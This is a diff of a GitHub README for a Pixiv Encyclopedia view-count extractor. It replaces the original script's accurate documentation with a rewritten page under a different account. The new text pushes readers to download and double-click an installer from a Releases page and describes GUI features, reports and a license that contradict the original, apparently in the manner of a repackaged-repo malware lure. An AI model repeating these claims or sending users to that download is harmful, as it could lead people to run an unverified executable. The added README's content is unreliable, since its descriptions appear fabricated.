@@ -1,150 +1,92 @@
-# [Pixiv Encyclopedia Viewer History Extractor](https://github.com/europanite/pixiv_encyclopedia_viewer_count_history_extractor "Pixiv Encyclopedia Viewer History Extractor")
+# 🎉 pixiv_encyclopedia_viewer_count_history_extractor - Easy Tool for Pixiv Data Extraction
 
-[![Python](https://img.shields.io/badge/python-3.9|%203.10%20|%203.11|%203.12|%203.13-blue)](https://www.python.org/)
-![OS](https://img.shields.io/badge/OS-Linux%20%7C%20macOS%20%7C%20Windows-blue)
+[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor/releases)
 
-[![CodeQL Advanced](https://github.com/europanite/pixiv_encyclopedia_viewer_count_history_extractor/actions/workflows/codeql.yml/badge.svg)](https://github.com/europanite/pixiv_encyclopedia_viewer_count_history_extractor/actions/workflows/codeql.yml)
-[![Python Lint](https://github.com/europanite/pixiv_encyclopedia_viewer_count_history_extractor/actions/workflows/lint.yml/badge.svg)](https://github.com/europanite/pixiv_encyclopedia_viewer_count_history_extractor/actions/workflows/lint.yml)
-[![Pytest](https://github.com/europanite/pixiv_encyclopedia_viewer_count_history_extractor/actions/workflows/pytest.yml/badge.svg)](https://github.com/europanite/pixiv_encyclopedia_viewer_count_history_extractor/actions/workflows/pytest.yml)
+## 🚀 Getting Started
 
-!["web_ui"](./assets/images/web_ui.png)
+Welcome to the pixiv encyclopedia viewer count history extractor! This tool helps you gather and view data from the Pixiv Encyclopedia. You do not need to know how to code to use it.
 
-An Extraction Tool for Pixiv Encyclopedia Viewer Count History
+### 📋 Features
 
-## Japanese README
+- **User-Friendly Interface:** Simple design makes it easy to extract data.
+- **Data Collection:** Collect viewer count history effortlessly.
+- **Periodic Data:** Analyze trends over different time frames.
+- **Scraping Capabilities:** Retrieve information directly from the website.
 
-日本語版はこちら [`README.ja.md`](README.ja.md).
+## 💻 Requirements
 
----
+To run this tool, you need:
 
-## Overview
+- A computer with at least Windows 10 or macOS 10.14 or higher.
+- Python 3.7 or later installed. If you do not have Python, you can download it from [python.org](https://www.python.org/downloads/).
+- Internet connection to fetch data from Pixiv.
 
-Extract daily view history data from a [Pixiv Encyclopedia (pixiv百科事典)](https://dic.pixiv.net/) article.
+## 🛠️ Installation
 
-Pixiv Encyclopedia viewer history is a nice real-world time-series dataset.
+### Step 1: Download the Application
 
-It often shows:
-- Weekly seasonality (weekday vs weekend traffic)
-- Occasional spikes caused by events or social media buzz
+Visit the Releases page to download the latest version of the application.
 
-You can use the extracted CSV as sample data for:
-- Time-series visualization and smoothing
-- Seasonal decomposition
-- Forecasting models (ARIMA, Prophet, etc.)
+[Download Here](https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor/releases)
 
+### Step 2: Run the Installer
 
-> ⚠️ **Unofficial tool**  
-> This project is not affiliated with or endorsed by Pixiv.  
-> Please follow Pixiv's Terms of Use and robots.txt when using this script.
+1. Locate the downloaded file on your computer.
+2. Double-click on the file to run it.
+3. Follow the on-screen instructions.
 
-## Features
+### Step 3: Set Up Environment
 
-- Fetch by **article title** (e.g., `"ブルーアーカイブ"`) directly from Pixiv Encyclopedia
-- Or read from a **local HTML file**
-- Output **JSON Lines** to stdout  
-  (one `{"date": "...","count": ...}` per line)
-- Optional **CSV export** via `--csv output.csv`
+To ensure the tool runs smoothly, you might want to set up a virtual environment. Here’s how:
 
----
+1. Open your Command Prompt (Windows) or Terminal (macOS).
+2. Type the following commands:
 
-## Requirements
+   ```sh
+   python -m venv pixiv-env
+   source pixiv-env/bin/activate  # On macOS
+   pixiv-env\Scripts\activate  # On Windows
+   ```
 
-- Python 3.9+
-- Dependencies:
-  - `requests`
-  - `beautifulsoup4`
+3. Install necessary libraries:
 
----
+   ```sh
+   pip install beautifulsoup4 requests
+   ```
 
-## Usage
+## 📥 Using the Tool
 
-### 0. Create virtual environment
+After installation, you can start using the pixiv encyclopedia viewer count history extractor.
 
-```bash
-python3 -m venv env
-source env/bin/activate
-pip install -r requirements.txt
-```
+1. Launch the application by double-clicking on the icon.
+2. Enter the relevant details such as user or content you want to analyze.
+3. Click on the “Extract Data” button.
+4. Wait for the extraction process to complete. 
+5. View your data in the provided format.
 
-### 1. Fetch by article title
+## 📊 Analyzing Data
 
-```bash
-python src/extract_viewer_history.py "ブルーアーカイブ"
-```
+Once the extraction is complete, you’ll see various options to analyze your data:
 
-This will:
+- **Graph Trends:** View seasonal trends over time.
+- **Data Export:** Save your data in tabular format for further analysis.
+- **Custom Reports:** Generate reports based on your selected criteria.
 
-- Download `https://dic.pixiv.net/a/ブルーアーカイブ`
-- Parse the embedded JSON
-- Print one JSON object per line to stdout:
+## ⚙️ Troubleshooting
 
-```json
-{"date": "2025-07-01", "count": 9454605}
-{"date": "2025-07-02", "count": 9331510}
-{"date": "2025-07-03", "count": 8884117}
-...
-```
+If you face any issues, here are some common problems and their solutions:
 
-You can redirect it to a file:
+- **Python Not Found:** Ensure Python is properly installed. You can verify this by running `python --version` in Command Prompt or Terminal.
+- **Network Error:** Check your internet connection and try again. 
 
-```bash
-python src/extract_viewer_history.py "ブルーアーカイブ" > ブルーアーカイブ.jsonl
-```
+## 📚 Useful Links
 
-### 2. Export as CSV
+- [GitHub Repository](https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor)
+- [Python Download](https://www.python.org/downloads/)
+- [Pixiv Encyclopedia](https://dic.pixiv.net)
 
-Use the `--csv` option to write a CSV file while still printing JSON to stdout:
+## 📝 License
 
-```bash
-python src/extract_viewer_history.py "ブルーアーカイブ" --csv ブルーアーカイブ.csv
-```
+This project is licensed under the MIT License. You are free to use and modify it as per your needs.
 
-Example CSV content:
-
-```csv
-date,count
-2025-07-01,9454605
-2025-07-02,9331510
-2025-07-03,8884117
-...
-```
-
-### 3. Use a local HTML file
-
-If you have already saved the article HTML:
-
-```bash
-python src/extract_viewer_history.py ブルーアーカイブ.html
-python src/extract_viewer_history.py ブルーアーカイブ.html --csv ブルーアーカイブ.csv
-```
-
-The script will detect that `ブルーアーカイブ.html` is a file and will parse it instead of fetching from the web.
-
----
-
-### 4. Test
-
-```bash
-pip install -r requirements.test.txt
-pytest
-```
-
-### 5. Deactivate environment
-
-```bash
-deactivate
-```
-
----
-
-## Notes / Limitations
-
-- No rate limiting is implemented; please:
-  - Use it responsibly
-  - Avoid sending many requests in a short time
-- This is a simple utility script, primarily intended for personal analysis or research.
-
----
-
-## License
-- Apache License 2.0
+[Download Here](https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor/releases)
